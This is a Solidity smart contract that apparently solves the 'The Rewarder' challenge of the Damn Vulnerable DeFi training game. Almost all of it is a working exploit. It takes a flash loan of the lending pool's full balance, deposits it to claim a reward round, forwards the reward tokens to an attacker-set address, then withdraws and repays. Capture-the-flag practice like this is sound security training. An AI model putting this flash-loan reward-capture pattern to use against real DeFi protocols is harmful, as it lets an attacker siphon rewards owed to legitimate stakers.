// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import {FlashLoanerPool} from "./FlashLoanerPool.sol";
import {TheRewarderPool} from "./TheRewarderPool.sol";
import {RewardToken} from "./RewardToken.sol";
import {DamnValuableToken} from "../DamnValuableToken.sol";
import {console} from "hardhat/console.sol";

contract RewarderAttacker {
    DamnValuableToken public immutable liquidityToken;
    RewardToken public immutable rewardToken;
    address private pool;
    address private borrower;
    address private flashLoaner;

    constructor(
        address _liquidityToken,
        address _rewardToken,
        address _pool,
        address _flashLoaner,
        address _borrower
    ) {
        pool = _pool;
        borrower = _borrower;
        flashLoaner = _flashLoaner;
        liquidityToken = DamnValuableToken(_liquidityToken);
        rewardToken = RewardToken(_rewardToken);
    }

    function attack() public {
        FlashLoanerPool(flashLoaner).flashLoan(
            liquidityToken.balanceOf(flashLoaner)
        );
    }

    function receiveFlashLoan(uint256 amount) external {
        console.log("receiveFlashLoan : %s", amount);
        console.log("before deposit : %s", TheRewarderPool(pool).roundNumber());
        liquidityToken.approve(pool, amount);
        TheRewarderPool(pool).deposit(amount);
        console.log("after deposit : %s", TheRewarderPool(pool).roundNumber());
        console.log(
            "rewardToken : %s",
            RewardToken(rewardToken).balanceOf(address(this))
        );
        RewardToken(rewardToken).transfer(
            borrower,
            RewardToken(rewardToken).balanceOf(address(this))
        );
        TheRewarderPool(pool).withdraw(amount);
        // payback flash loan
        liquidityToken.transfer(flashLoaner, amount);
    }

    receive() external payable {}

    fallback() external payable {}
}
